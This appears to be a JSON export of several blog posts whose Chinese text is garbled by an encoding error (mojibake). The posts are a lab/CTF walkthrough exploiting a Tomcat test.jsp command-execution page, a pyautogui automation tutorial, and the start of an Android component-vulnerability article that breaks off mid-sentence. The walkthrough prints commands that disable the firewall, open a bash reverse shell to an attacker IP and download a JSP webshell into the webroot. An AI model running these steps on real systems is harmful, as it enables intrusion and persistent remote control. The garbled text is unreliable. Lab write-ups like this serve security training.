date":"2021-12-06T17:13:16.000Z","updated":"2022-01-03T03:30:26.259Z","comments":true,"path":"post/bb5c1570.html","link":"","permalink":"https://wolke.cn/post/bb5c1570.html","excerpt":"","text":"ä¸€ã€é¶æœºè¯´æ˜1ã€ä¸‹è½½é“¾æ¥&emsp;&emsp;é¶åœºé•œåƒï¼šé“¾æ¥: https://pan.baidu.com/s/19k8jz7VARhFW3LYw8U6T9w æå–ç : 97qz 2ã€é¶æœºå‡†å¤‡ï¼ˆ1ï¼‰é‡ç½®é¶åœºå¯†ç &emsp;&emsp;é‡å¯ä¸»æœºï¼Œé•¿æŒ‰shiftï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢åï¼ŒæŒ‰e &emsp;&emsp;æ‰¾åˆ°linuxå¼€å¤´çš„è¡Œï¼Œåœ¨æœ€åè¾“å…¥ init=/bin/bashï¼Œè¾“å…¥å®ŒæˆåæŒ‰Crtl+X &emsp;&emsp;mount -o rw,remount /ï¼Œå›è½¦ &emsp;&emsp; passwd rootï¼Œè¾“å…¥æ–°å¯†ç ä¸¤æ¬¡ &emsp;&emsp;å¦‚æœæç¤ºæ”¹å˜å¯†ç æˆåŠŸï¼Œé‡å¯è¯¥è™šæ‹Ÿæœº ï¼ˆ2ï¼‰æŸ¥çœ‹IP&emsp;&emsp;ä½¿ç”¨åˆšæ‰ä¿®æ”¹çš„å¯†ç è¿›å…¥é¶åœºä¸»æœºï¼Œè¾“å…¥ip aï¼ŒæŸ¥çœ‹IPåœ°å€ äºŒã€é¢„å¤‡çŸ¥è¯†&emsp;&emsp;ä½¿ç”¨ ssh ç”¨æˆ·å@localhost é€šè¿‡sshç™»å½•æœåŠ¡å™¨æ˜¯ä¸éœ€è¦èº«ä»½éªŒè¯çš„ ä¸‰ã€ä¿¡æ¯æ”¶é›†1ã€æ¢æµ‹ä¸»æœºIP&emsp;&emsp;å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼šarp-scanå’Œnetdiscover ï¼ˆ1ï¼‰arp-scan&emsp;&emsp;ä½¿ç”¨arp-scanæ¢ç´¢é¶æœºIPï¼Œå‘ç°IPåœ°å€ä¸º192.168.1.107 arp-scan -l ï¼ˆ2ï¼‰netdiscover&emsp;&emsp;ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹Kaliæœ¬æœºIPä¸º192.168.1.108 ip a &emsp;&emsp;ä½¿ç”¨netdiscoverå‘½ä»¤ netdiscover -r ip/å­ç½‘æ©ç  å‘½ä»¤æ¥æ¢æµ‹é¶æœº netdiscover -r 192.168.1.1/24 2ã€å¼€æ”¾ç«¯å£ä¸æœåŠ¡æ‰«æ&emsp;&emsp;ä½¿ç”¨nmapå¯¹IPè¿›è¡Œæ‰«æï¼š nmap -sV 192.168.1.107 &emsp;&emsp;å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†8080ç«¯å£ï¼Œä¸ºHTTPæœåŠ¡ &emsp;&emsp;è®¿é—®8080ç«¯å£ï¼Œå‘ç°æ˜¯Tomcatå»ºç«‹æˆåŠŸçš„åˆå§‹é¡µé¢ 3ã€ç›®å½•æ‰«æ&emsp;&emsp;å¯ä»¥ä½¿ç”¨dirsearchæ‰«ææˆ–è€…niktoæ¢æµ‹ ï¼ˆ1ï¼‰dirsearch&emsp;&emsp;ç›®å½•æ‰«æï¼š dirsearch -u http://192.168.1.107:8080 &emsp;&emsp;æ‰«å‡ºäº†ä¸ª/test.jsp ï¼ˆ2ï¼‰nikto&emsp;&emsp;ä½¿ç”¨niktoæ¢æµ‹ï¼Œå‘ç°test.jspå¯èƒ½æ¯”è¾ƒå› ç¼ºæ€å…ï¼Œé‚£ä¹ˆå°±è®©æˆ‘åº·åº·ï¼ å››ã€æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨1ã€æ¼æ´æ¢æµ‹â€”â€”å‘½ä»¤æ‰§è¡Œ&emsp;&emsp;è®¿é—®ï¼šhttp://192.168.1.107:8080/test.jspï¼Œå‡ºç°ä»¥ä¸‹é¡µé¢ï¼Œè¿™æ˜¯ä¸€ä¸ªè°ƒè¯•é¡µé¢ï¼Œå¯ä»¥ç”¨æ¥å‘½ä»¤æ‰§è¡Œ 2ã€ä¿¡æ¯æ”¶é›†&emsp;&emsp;æŸ¥çœ‹ä¸´æ—¶ç¼“å†²ç›®å½•ï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ ls -alh /tmp/ &emsp;&emsp;æŸ¥çœ‹homeç›®å½•ï¼ŒæŒ–æ˜ç”¨æˆ·ä¿¡æ¯ï¼Œå‘ç°äº†bill ls -la /home &emsp;&emsp;æŸ¥çœ‹å…·ä½“ç”¨æˆ·billçš„ç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…·æœ‰sshæœåŠ¡ï¼Œåç»­å¯ä»¥ä½¿ç”¨sudoæ¥æ‹¿åˆ°root ls /home/bill -lah &emsp;&emsp;æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œä¸ºubuntuç³»ç»Ÿ uname -a &emsp;&emsp;æŸ¥çœ‹ç”¨æˆ·billåœ¨ä¸»æœºä¸Šå¯ä»¥ä½¿ç”¨å’Œç¦æ­¢çš„å‘½ä»¤ï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ ssh bill@localhost sudo -l 3ã€åå¼¹shell&emsp;&emsp;å…³é—­é˜²ç«å¢™ï¼Œæ²¡æœ‰æ¶ˆæ¯å°±æ˜¯å¥½æ¶ˆæ¯ï¼Œå…³é—­é˜²ç«å¢™æˆåŠŸ ssh bill@localhost sudo ufw disable &emsp;&emsp;kaliæ‰“å¼€ncç›‘å¬æŸä¸ªç«¯å£ï¼Œè¿™é‡Œæˆ‘è®¾ç½®ä¸º4444 nc -lvp 4444 &emsp;&emsp;åå¼¹shell ssh bill@localhost sudo bash -i &gt;&amp; /dev/tcp/æ”»å‡»è€…IP/4444 0&gt;&amp;1 ã€æ’æ’­ï¼šæ¸—é€æµ‹è¯•æŠ€å·§ã€‘ &emsp;&emsp;å¼€å¯pythonç®€æ˜“httpæœåŠ¡å™¨ python -m SimpleHTTPServer &emsp;&emsp;åˆ©ç”¨å‘½ä»¤æ‰§è¡Œä¸‹è½½æœ¨é©¬æ–‡ä»¶ ssh bill@localhost sudo wget â€œhttp://ip:port/shell.jspâ€ -O /var /lib/tomcat8/webapps/ROOT/shell.jsp &emsp;&emsp;æ‹¿åˆ°flag äº”ã€æ€»ç»“&emsp;&emsp;åœ¨CTFæ¯”èµ›ä¸­ï¼Œå‘½ä»¤æ‰§è¡Œæ¼æ´å…·æœ‰å¾ˆå¤šè¿‡æ»¤æœºåˆ¶ã€‚å¯¹äºå¼€æ”¾sshæœåŠ¡çš„é¶åœºæœºå™¨ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸Šæ–¹æ³•è¿›è¡Œæ¸—é€é¶åœºæœºå™¨ã€‚å¦‚æœæ²¡æœ‰å¼€æ”¾sshæœåŠ¡ï¼Œåˆ™éœ€è¦åˆ©ç”¨ç»•è¿‡è¿‡æ»¤æŠ€å·§æ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚","categories":[{"name":"ç»¼åˆé¶åœº","slug":"ç»¼åˆé¶åœº","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"SSH","slug":"SSH","permalink":"https://wolke.cn/tags/SSH/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"https://wolke.cn/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"author":"w01ke"},{"title":"pyautoguiæ¨¡å—","slug":"pyautoguiæ¨¡å—","date":"2021-12-06T11:53:27.000Z","updated":"2022-01-03T03:29:16.625Z","comments":true,"path":"post/2681d601.html","link":"","permalink":"https://wolke.cn/post/2681d601.html","excerpt":"","text":"ä¸€ã€GUIæ§åˆ¶åŠŸèƒ½ æ§åˆ¶é¼ æ ‡é”®ç›˜ä½¿ç”¨çš„æ¨¡å—ä¸ºï¼špyautoguiï¼Œè¿™ä¸ªæ¨¡å—æ“ä½œèµ·é¼ æ ‡é”®ç›˜çš„æ—¶å€™ï¼Œéå¸¸çš„è¿…é€Ÿï¼Œè€Œä¸”å¦‚æœè¯¥æ¨¡å—æ§åˆ¶äº†é¼ æ ‡åï¼Œç¨‹åºæ¯”è¾ƒéš¾å…³é—­ï¼Œè¿™æ—¶æˆ‘ä»¬æœ‰ä¸¤ä¸ªæ–¹æ³•ä¸“é—¨é’ˆå¯¹ä»¥ä¸Šçš„æƒ…å†µï¼š 1.1 è‡ªåŠ¨é˜²æ•…éšœåŠŸèƒ½pyautogui.FAILSAFE =False é»˜è®¤è¿™é¡¹åŠŸèƒ½ä¸ºTrue, è¿™é¡¹åŠŸèƒ½æ„å‘³ç€ï¼šå½“é¼ æ ‡çš„æŒ‡é’ˆåœ¨å±å¹•çš„æœ€åä¸Šæ–¹ï¼Œç¨‹åºä¼šæŠ¥é”™ï¼›ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ç¨‹åºæ— æ³•åœæ­¢ï¼› 1.2 åœé¡¿åŠŸèƒ½pyautogui.PAUSE = 1 æ„å‘³ç€æ‰€æœ‰pyautoguiçš„æŒ‡ä»¤éƒ½è¦æš‚åœä¸€ç§’ï¼›å…¶ä»–æŒ‡ä»¤ä¸ä¼šåœé¡¿ï¼›è¿™æ ·åšï¼Œå¯ä»¥é˜²æ­¢é”®ç›˜é¼ æ ‡æ“ä½œå¤ªå¿«ï¼› äºŒã€é¼ æ ‡ç§»åŠ¨2.1 æ§åˆ¶é¼ æ ‡ç§»åŠ¨2.1.1 è·å¾—å±å¹•åˆ†è¾¨ç‡print(pyautogui.size()) # è¿”å›æ‰€ç”¨æ˜¾ç¤ºå™¨çš„åˆ†è¾¨ç‡ï¼› è¾“å‡ºï¼šSize(width=1920, height=1080)width,height = pyautogui.size()print(width,height) # 1920 1080 2.1.2 ç§»åŠ¨é¼ æ ‡â‘  ç§»åŠ¨åˆ°æŒ‡å®šä½ç½®pyautogui.moveTo(100, 300, duration=1) å°†é¼ æ ‡ç§»åŠ¨åˆ°æŒ‡å®šçš„åæ ‡ï¼›duration çš„ä½œç”¨æ˜¯è®¾ç½®ç§»åŠ¨æ—¶é—´ï¼Œæ‰€æœ‰çš„guiå‡½æ•°éƒ½æœ‰è¿™ä¸ªå‚æ•°ï¼Œè€Œä¸”éƒ½æ˜¯å¯é€‰å‚æ•° â‘¡ æŒ‰æ–¹å‘ç§»åŠ¨ï¼ˆç›¸å¯¹ç§»åŠ¨ï¼‰pyautogui.moveRel(100, 500, duration=2) # ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å·¦å³ç§»åŠ¨åƒç´ å€¼ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸Šä¸‹ ç›¸å¯¹äºå½“å‰ä½ç½®ç§»åŠ¨å…‰æ ‡ï¼Œå‘å³ç§»åŠ¨100pxï¼Œå‘ä¸‹ç§»åŠ¨500px, è¿™ä¸ªè¿‡ç¨‹æŒç»­ 4 ç§’é’Ÿï¼› 2.1.3 è·å–é¼ æ ‡ä½ç½®print(pyautogui.position()) # å¾—åˆ°å½“å‰é¼ æ ‡ä½ç½®ï¼›è¾“å‡ºï¼šPoint(x=200, y=800) 2.2 æ§åˆ¶é¼ æ ‡ç‚¹å‡»2.2.1 å•å‡»é¼ æ ‡# ç‚¹å‡»é¼ æ ‡pyautogui.click(10, 10) # é¼ æ ‡ç‚¹å‡»æŒ‡å®šä½ç½®ï¼Œé»˜è®¤å·¦é”®pyautogui.click(10, 10, button=&#x27;left&#x27;) # å•å‡»å·¦é”®pyautogui.click(1000, 300, button=&#x27;right&#x27;) # å•å‡»å³é”®pyautogui.click(1000, 300, button=&#x27;middle&#x27;) # å•å‡»ä¸­é—´ 2.2.2 åŒå‡»é¼ æ ‡pyautogui.doubleClick(10,10) # æŒ‡å®šä½ç½®ï¼ŒåŒå‡»å·¦é”®pyautogui.rightClick(10,10) # æŒ‡å®šä½ç½®ï¼ŒåŒå‡»å³é”®pyautogui.middleClick(10,10) # æŒ‡å®šä½ç½®ï¼ŒåŒå‡»ä¸­é”® 2.2.3 ç‚¹å‡»å’Œé‡Šæ”¾pyautogui.mouseDown() # é¼ æ ‡æŒ‰ä¸‹ï¼ˆç‚¹å‡»ï¼‰pyautogui.mouseUp() # é¼ æ ‡é‡Šæ”¾ 2.3 æ§åˆ¶é¼ æ ‡æ‹–åŠ¨2.3.1 æ‹–åŠ¨åˆ°æŒ‡å®šä½ç½®pyautogui.dragTo(100,300,duration=1) å°†é¼ æ ‡æ‹–åŠ¨åˆ°æŒ‡å®šçš„åæ ‡ï¼›duration çš„ä½œç”¨æ˜¯è®¾ç½®ç§»åŠ¨æ—¶é—´ï¼Œæ‰€æœ‰çš„guiå‡½æ•°éƒ½æœ‰è¿™ä¸ªå‚æ•°ï¼Œè€Œä¸”éƒ½æ˜¯å¯é€‰å‚æ•°ï¼› 2.3.2 æŒ‰æ–¹å‘æ‹–åŠ¨ï¼ˆç›¸å¯¹æ‹–åŠ¨ï¼‰pyautogui.dragRel(100,500,duration=4) # ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å·¦å³ç§»åŠ¨åƒç´ å€¼ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸Šä¸‹ ç›¸å¯¹å…‰æ ‡å½“å‰ä¸ºä½ç½®å‘å³æ‹–åŠ¨100pxï¼Œå‘ä¸‹æ‹–åŠ¨500px, è¿™ä¸ªè¿‡ç¨‹æŒç»­ 4 ç§’é’Ÿï¼› 2.4 æ§åˆ¶é¼ æ ‡æ»šåŠ¨ æ§åˆ¶é¼ æ ‡æ»šåŠ¨çš„å‡½æ•°æ˜¯scroll()ï¼Œ ä¼ å…¥ä¸€ä¸ªæ•´æ•°çš„å‚æ•°ï¼Œè¯´æ˜å‘ä¸Šæˆ–å‘ä¸‹æ»šåŠ¨å¤šå°‘ä¸ªå•ä½ï¼›å•ä½æ ¹æ®æ“ä½œç³»ç»Ÿä¸åŒè€Œä¸åŒï¼› pyautogui.scroll(300) # å‘ä¸Šæ»šåŠ¨300ä¸ªå•ä½pyautogui.scroll(-300) # å‘ä¸‹æ»šåŠ¨300ä¸ªå•ä½ ä¸‰ã€å±å¹•å¤„ç†3.1 è·å–å±å¹•æˆªå›¾ æˆ‘ä»¬æ§åˆ¶é¼ æ ‡çš„æ“ä½œï¼Œä¸èƒ½ç›²ç›®çš„è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç›‘æ§å±å¹•ä¸Šçš„å†…å®¹ï¼Œä»è€Œå†³å®šè¦ä¸è¦è¿›è¡Œå¯¹åº”çš„æ“ä½œï¼Œ pyautogui æä¾›äº†ä¸€ä¸ªæ–¹æ³•screenshot()ï¼Œå¯ä»¥è¿”å›ä¸€ä¸ªPillowçš„imageå¯¹è±¡ï¼› è¿™é‡Œæœ‰ä¸‰ä¸ªå¸¸ç”¨å‡½æ•°ï¼š im = pyautogui.screenshot()ï¼šè¿”å›å±å¹•çš„æˆªå›¾ï¼Œæ˜¯ä¸€ä¸ªPillowçš„imageå¯¹è±¡ im.getpixel((500, 500))ï¼šè¿”å›imå¯¹è±¡ä¸Šï¼Œï¼ˆ500ï¼Œ500ï¼‰è¿™ä¸€ç‚¹åƒç´ çš„é¢œè‰²ï¼Œæ˜¯ä¸€ä¸ªRGBå…ƒç»„ pyautogui.pixelMatchesColor(500,500,(12,120,400))ï¼šæ˜¯ä¸€ä¸ªå¯¹æ¯”å‡½æ•°ï¼Œå¯¹æ¯”çš„æ˜¯å±å¹•ä¸Šï¼ˆ500ï¼Œ500ï¼‰è¿™ä¸€ç‚¹åƒç´ çš„é¢œè‰²ï¼Œä¸æ‰€ç»™çš„å…ƒç´ æ˜¯å¦ç›¸åŒï¼› im = pyautogui.screenshot()im.save(&#x27;å±å¹•æˆªå›¾.png&#x27;) ä¿å­˜å±å¹•æˆªå›¾ 3.2 è¯†åˆ«å›¾åƒ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å…ˆè·å¾—ä¸€ä¸ªå±å¹•å¿«ç…§ï¼Œä¾‹å¦‚æˆ‘ä»¬æƒ³è¦ç‚¹èµï¼Œæˆ‘ä»¬å°±å…ˆæŠŠå¤§æ‹‡æŒ‡çš„å›¾ç‰‡ä¿å­˜ä¸‹æ¥ï¼›ç„¶åä½¿ç”¨å‡½æ•°ï¼šlocateOnScreen(&#39;zan.png&#39;) ï¼Œå¦‚æœå¯ä»¥æ‰¾åˆ°å›¾ç‰‡ï¼Œåˆ™è¿”å›å›¾ç‰‡çš„ä½ç½®ï¼Œå¦‚ï¼šBox(left=25, top=703, width=22, height=22)ï¼›å¦‚æœæ‰¾ä¸åˆ°å›¾ç‰‡ï¼Œåˆ™è¿”å›None; å¦‚æœï¼Œå±å¹•ä¸Šæœ‰å¤šå¤„å›¾ç‰‡å¯ä»¥åŒ¹é…ï¼Œåˆ™éœ€è¦ä½¿ç”¨locateAllOnScreen(&#39;zan.png&#39;)ï¼Œå¦‚æœåŒ¹é…åˆ°å¤šä¸ªå€¼ï¼Œåˆ™è¿”å›ä¸€ä¸ªlistï¼Œå‚è€ƒå¦‚ä¸‹ï¼š import pyautoguipyautogui.PAUSE = 1# å›¾åƒè¯†åˆ«ï¼ˆä¸€ä¸ªï¼‰btm = pyautogui.locateOnScreen(&#x27;zan.png&#x27;)print(btm) # Box(left=1280, top=344, width=22, height=22)# å›¾åƒè¯†åˆ«ï¼ˆå¤šä¸ªï¼‰btm = pyautogui.locateAllOnScreen(&#x27;zan.png&#x27;)print(list(btm)) # [Box(left=1280, top=344, width=22, height=22), Box(left=25, top=594, width=22, height=22)] pyautogui.center((left, top, width, height)) è¿”å›æŒ‡å®šä½ç½®çš„ä¸­å¿ƒç‚¹ï¼›è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†é…åˆé¼ æ ‡æ“ä½œç‚¹å‡»æ‰¾åˆ°å›¾ç‰‡çš„ä¸­å¿ƒï¼›å‚è€ƒå®ä¾‹ï¼š å››ã€é”®ç›˜è¾“å…¥4.1 é”®ç›˜è¾“å…¥å‡½æ•°pyautogui.keyDown(): æ¨¡æ‹ŸæŒ‰é”®æŒ‰ä¸‹;pyautogui.keyUp(): æ¨¡æ‹ŸæŒ‰é”®é‡Šæ”¾;pyautogui.press(): # å°±æ˜¯è°ƒç”¨keyDown() &amp; keyUp(),æ¨¡æ‹Ÿä¸€æ¬¡æŒ‰é”®ï¼›pyautogui.typewrite(&#x27;this&#x27;,0.5) ï¼š ç¬¬ä¸€å‚æ•°æ˜¯è¾“å…¥å†…å®¹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ¯ä¸ªå­—ç¬¦é—´çš„é—´éš”æ—¶é—´ï¼›pyautogui.typewrite([&#x27;T&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;s&#x27;]): typewrite è¿˜å¯ä»¥ä¼ å…¥å•å­—æ¯çš„åˆ—è¡¨ï¼› ä¸¾ä¾‹ï¼š pyautogui.keyDown(&#x27;shift&#x27;) # æŒ‰ä¸‹shiftpyautogui.press(&#x27;4&#x27;) # æŒ‰ä¸‹ 4pyautogui.keyUp(&#x27;shift&#x27;) # é‡Šæ”¾ shift è¾“å‡ºï¼š$ pyautogui.typewrite(&#x27;$$$$&#x27;, 0.5) è¾“å…¥$$$$ï¼Œæ¯ä¸ªå­—ç¬¦é—´éš”ä¸º0.5s 4.2 é”®ç›˜ç‰¹æ®ŠæŒ‰é”® æœ‰æ—¶æˆ‘ä»¬éœ€è¦è¾“å…¥ä¸€äº›ç‰¹æ®Šçš„æŒ‰é”®ï¼Œæ¯”å¦‚å‘å·¦çš„ç®­å¤´ï¼Œè¿™äº›æœ‰ç›¸å¯¹åº”çš„é”®ç›˜å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œä¾‹å¦‚ï¼š pyautogui.typewrite([&#x27;T&#x27;,&#x27;i&#x27;,&#x27;s&#x27;,&#x27;left&#x27;,&#x27;left&#x27;,&#x27;h&#x27;,]) # è¾“å‡ºï¼šThis è§£é‡Šï¼šè¿™é‡Œçš„leftå°±æ˜¯å‘å·¦çš„ç®­å¤´ï¼›è¯¸å¦‚æ­¤ç±»çš„é”®ç›˜å­—ç¬¦ä¸²ï¼Œè¿˜æœ‰å¾ˆå¤šï¼Œå‚è€ƒä¸‹è¡¨ï¼š 4.3 å¿«æ·é”® å¦‚æœæˆ‘ä»¬éœ€è¦æ¨¡æ‹Ÿå¤åˆ¶çš„å¿«æ·é”® ctrl + c ï¼Œå¦‚æœç”¨å‰é¢çš„æ–¹æ³•ï¼Œåˆ™ä»£ç ä¸ºï¼š pyautogui.keyDown(&#x27;ctrl&#x27;)pyautogui.keyDown(&#x27;c&#x27;)pyautogui.keyUp(&#x27;c&#x27;)pyautogui.keyUp(&#x27;ctrl&#x27;) å¿«æ·é”®çš„æŒ‰é”®ä¸é‡Šæ”¾é¡ºåºéå¸¸å…³é”®ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ pyautogui.hotkey()ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥æ¥å—å¤šä¸ªå‚æ•°ï¼ŒæŒ‰ä¼ å…¥é¡ºåºæŒ‰ä¸‹ï¼Œå†æŒ‰ç…§ç›¸åé¡ºåºé‡Šæ”¾ã€‚ä¸Šè¿°å¿«æ·é”® ctrl + c ï¼Œå¯ä»¥å°†ä»£ç å˜ä¸ºï¼š pyautogui.hotkey(&#x27;ctrl&#x27;,&#x27;c&#x27;) äº”ã€æç¤ºä¿¡æ¯æ¡†5.1 æç¤ºæ¡†/è­¦å‘Šæ¡†import pyautoguia = pyautogui.alert(text=&#x27;This is an alert box.&#x27;, title=&#x27;Test&#x27;)print(a) è¾“å‡ºå¦‚ä¸‹å›¾ï¼šç‚¹å‡»ç¡®å®šï¼Œè¿”å›å€¼ä¸ºOK 5.2 é€‰æ‹©æ¡†import pyautoguia = pyautogui.confirm(&#x27;é€‰æ‹©ä¸€é¡¹&#x27;, buttons=[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;])print(a) è¾“å‡ºå¦‚ä¸‹å›¾ï¼šç‚¹å‡»Bé€‰é¡¹ï¼Œè¿”å›å€¼ä¸ºB 5.3 å¯†ç è¾“å…¥import pyautoguia = pyautogui.password(&#x27;Enter password (text will be hidden)&#x27;)print(a) è¾“å‡ºå¦‚ä¸‹å›¾ï¼šè¾“å…¥å¯†ç ï¼Œæ˜¾ç¤ºä¸ºå¯†æ–‡ï¼Œç‚¹å‡»OKï¼Œè¿”å›å€¼ä¸ºåˆšåˆšè¾“å…¥çš„å€¼ï¼› 5.4 æ™®é€šè¾“å…¥import pyautoguia = pyautogui.prompt(&#x27;è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼š&#x27;)print(a) è¾“å‡ºå¦‚ä¸‹å›¾ï¼šæ˜¾ç¤ºä¸ºæ˜æ–‡ï¼Œç‚¹å‡»OKï¼Œè¿”å›å€¼ä¸ºåˆšåˆšè¾“å…¥çš„å€¼ï¼› å…­ã€å®ä¾‹6.1 é¼ æ ‡æ§åˆ¶ï¼šé¼ æ ‡ç”»ä¸€ä¸ªæ­£æ–¹å½¢import pyautoguifor i in range(2): # ç”»æ­£æ–¹å½¢ pyautogui.moveTo(200, 200, duration=1) pyautogui.moveTo(200, 400, duration=1) pyautogui.moveTo(400, 400, duration=0.5) pyautogui.moveTo(400, 200, duration=2) 6.2 è·å–é¼ æ ‡çš„å®æ—¶ä½ç½®import pyautoguiimport timetry: while True: x, y = pyautogui.position() posi = &#x27;x:&#x27; + str(x).rjust(4) + &#x27; y:&#x27; + str(y).rjust(4) print(&#x27;\\r&#x27;, posi, end=&#x27;&#x27;) time.sleep(0.5)except KeyboardInterrupt: print(&#x27;å·²é€€å‡ºï¼&#x27;) æ˜¾ç¤ºæ•ˆæœï¼š 6.3 è·å–é¼ æ ‡ä½ç½®ä¸æ‰€åœ¨ä½ç½®çš„é¢œè‰²import pyautoguiimport timetry: while True: x, y = pyautogui.position() rgb = pyautogui.screenshot().getpixel((x, y)) posi = &#x27;x:&#x27; + str(x).rjust(4) + &#x27; y:&#x27; + str(y).rjust(4) + &#x27; RGB:&#x27; + str(rgb) print(&#x27;\\r&#x27;, posi, end=&#x27;&#x27;) time.sleep(0.5)except KeyboardInterrupt: print(&#x27;å·²é€€å‡ºï¼&#x27;) æ˜¾ç¤ºæ•ˆæœï¼š 6.4 è‡ªåŠ¨ç‚¹èµç¨‹åº æˆ‘ä»¬éœ€è¦å°†æ‰€æœ‰çš„è¯´è¯´ç‚¹èµï¼Œæœ¬é¡µä¸Šçš„ç‚¹èµå®Œæˆåï¼Œå°±æ»šåŠ¨é¼ æ ‡ï¼ŒæŠŠæ–°åŠ è½½çš„è¯´è¯´ä¹Ÿå…¨éƒ¨ç‚¹èµï¼› ä»£ç å¦‚ä¸‹ï¼š import pyautoguiimport timedef zan(): time.sleep(0.5) # ç­‰å¾… 0.5 ç§’ left, top, width, height = pyautogui.locateOnScreen(&#x27;qzonezan.png&#x27;) # å¯»æ‰¾ ç‚¹èµå›¾ç‰‡ï¼› center = pyautogui.center((left, top, width, height)) # å¯»æ‰¾ å›¾ç‰‡çš„ä¸­å¿ƒ pyautogui.click(center) # ç‚¹å‡» print(&#x27;ç‚¹èµæˆåŠŸï¼&#x27;)while True: if pyautogui.locateOnScreen(&#x27;qzonezan.png&#x27;): zan() # è°ƒç”¨ç‚¹èµå‡½æ•° else: pyautogui.scroll(-700) # æœ¬é¡µæ²¡æœ‰å›¾ç‰‡åï¼Œæ»šåŠ¨é¼ æ ‡ï¼› print(&#x27;æ²¡æœ‰æ‰¾åˆ°ç›®æ ‡ï¼Œå±å¹•ä¸‹æ»š~&#x27;)","categories":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"https://wolke.cn/tags/%E7%88%AC%E8%99%AB/"}],"author":"w01ke"},{"title":"å¸¸è§Androidç»„ä»¶/æ§ä»¶æ¼æ´","slug":"å¸¸è§Androidç»„ä»¶-æ§ä»¶æ¼æ´","date":"2021-12-06T11:27:35.000Z","updated":"2022-01-15T07:45:54.395Z","comments":true,"path":"post/cb60dfd6.html","link":"","permalink":"https://wolke.cn/post/cb60dfd6.html","excerpt":"","text":"ä¸€ã€å‰è¨€&emsp;&emsp;å¯¹äº Android app æœ¬èº«æ¥è¯´ï¼Œä¹Ÿæ˜¯ä¼šå­˜åœ¨ä¸€äº›ç»„ä»¶å®‰å…¨æ¼æ´çš„ï¼Œæœ¬æ–‡å°±ä»‹ç»ä¸€äº›å¸¸è§çš„ Android ç»„ä»¶æ¼æ´ã€‚ äºŒã€Androidç»„ä»¶å®‰å…¨&emsp;&emsp;é¦–å…ˆè¦çŸ¥é“ï¼ŒAndroid ä¸­æœ€é‡è¦çš„é£é™©ç‚¹å°±æ˜¯ android:exported=&quot;true&quot; è¿™ä¸€å±æ€§ã€‚ç»„ä»¶è¢«å¯¼å‡ºå°±æ„å‘³ç€å¤§æ¦‚ç‡ä¼šäº§ç”Ÿæ¼æ´ã€‚è¿™æ˜¯ä¸åŒåº”ç”¨ç¨‹åºé—´å…±äº«æ•°æ®çš„å”¯ä¸€æ–¹å¼ï¼Œå› ä¸ºandroid æ²¡æœ‰æä¾›æ‰€æœ‰åº”ç”¨å…±åŒè®¿é—®çš„å…¬å…±å­˜å‚¨åŒºã€‚æ¯”å¦‚é€šè®¯å½•æ•°æ®ã€‚ &emsp;&emsp;é¦–å…ˆäº†è§£ä¸€ä¸‹å››å¤§ç»„ä»¶ï¼šactivityï¼Œserviceï¼Œbroadcastï¼Œcontentproviderã€‚ 2.1 å››å¤§ç»„ä»¶2.1.1 activity&emsp;&emsp;å¯¹äº app æ¥è¯´ï¼Œæ¯ä¸€ä¸ªç•Œé¢éƒ½æ˜¯ä¸€ä¸ª activityï¼Œæ¯ä¸€ä¸ª activity éƒ½ä¼šæœ‰ç€ä¸åŒçš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ³¨å†Œï¼Œç™»å½•ï¼Œæ‰‹åŠ¿å¯†ç ç­‰ã€‚æ¯ä¸€ä¸ª activity çš„åˆ‡æ¢éœ€è¦ä¸åŒçš„æ¡ä»¶ã€‚ 2.1.2 service&emsp;&emsp;service æœåŠ¡ï¼Œä¼´éšç€ç¨‹åºå¯åŠ¨ï¼Œä¼šä¸€ç›´åœ¨åå°è¿è¡Œï¼Œä¸»è¦æ˜¯æ£€æµ‹ä½œç”¨ï¼Œæ£€æµ‹å®¢æˆ·ç«¯çš„çŠ¶æ€ï¼Œä¸Šä¼ ç”¨æˆ·çš„æ“ä½œã€‚ 2.1.3 broadcast&emsp;&emsp;broadcast åˆ†ä¸ºä¸¤ä¸ªæ–¹é¢ï¼Œå¹¿æ’­å‘é€è€…å’Œå¹¿æ’­æ¥æ”¶è€…ã€‚Android æä¾›ä¸€æ•´å¥—çš„ apiï¼Œå…è®¸ app 